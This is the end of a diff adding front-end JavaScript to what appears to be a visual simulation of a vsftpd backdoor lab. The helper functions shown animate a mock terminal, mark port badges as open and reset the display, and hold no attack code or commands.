+            term.appendChild(line);
+            
+            let i = 0;
+            const interval = setInterval(() => {
+                line.textContent += text.charAt(i);
+                i++;
+                term.scrollTop = term.scrollHeight;
+                if(i >= text.length) clearInterval(interval);
+            }, 10);
+        }
+
+        function clearTerminal() {
+            document.getElementById('terminal-body').innerHTML = '';
+        }
+
+        function highlightLine(id) {
+            document.querySelectorAll('.code-active').forEach(el => el.classList.remove('code-active'));
+            if(id) {
+                const el = document.getElementById(`line-${id}`);
+                if(el) {
+                    el.classList.add('code-active');
+                    el.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }
+            }
+        }
+
+        function markPortOpen(nodeId, port) {
+            const badge = document.querySelector(`#${nodeId} .port-badge[data-port="${port}"]`);
+            if(badge) {
+                badge.classList.remove('bg-slate-950', 'border-slate-700');
+                badge.classList.add('bg-green-900/40', 'border-green-600');
+                badge.querySelector('.status-dot').classList.replace('bg-slate-600', 'bg-green-500');
+                badge.querySelector('span').classList.replace('text-slate-400', 'text-green-300');
+            }
+        }
+
+        function setStatus(msg) {
+            const el = document.getElementById('action-status');
+            el.innerText = msg;
+            el.classList.remove('hidden');
+        }
+
+        function hideStatus() {
+            document.getElementById('action-status').classList.add('hidden');
+        }
+
+        function resetVisuals() {
+            // Reset Ports
+            document.querySelectorAll('.port-badge').forEach(b => {
+                b.className = "port-badge flex items-center gap-1.5 bg-slate-950 px-2 py-1 rounded border border-slate-700";
+                b.querySelector('.status-dot').className = "w-1.5 h-1.5 rounded-full bg-slate-600 status-dot";
+                b.querySelector('span').className = "font-mono text-[10px] text-slate-400";
+            });
+            // Reset vsftpd specific
+            document.getElementById('backdoor-port').classList.add('hidden');
+            document.getElementById('backdoor-port').classList.remove('flex');
+            document.getElementById('shell-window').classList.add('hidden');
+            document.getElementById('vsftpd-box').className = "node-box w-64 bg-slate-800/80 rounded-lg border border-slate-600 p-3 flex items-center justify-between shadow-lg relative backdrop-blur-sm transition-colors duration-500";
+        }
+
+        function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+    </script>
+</body>
+</html>
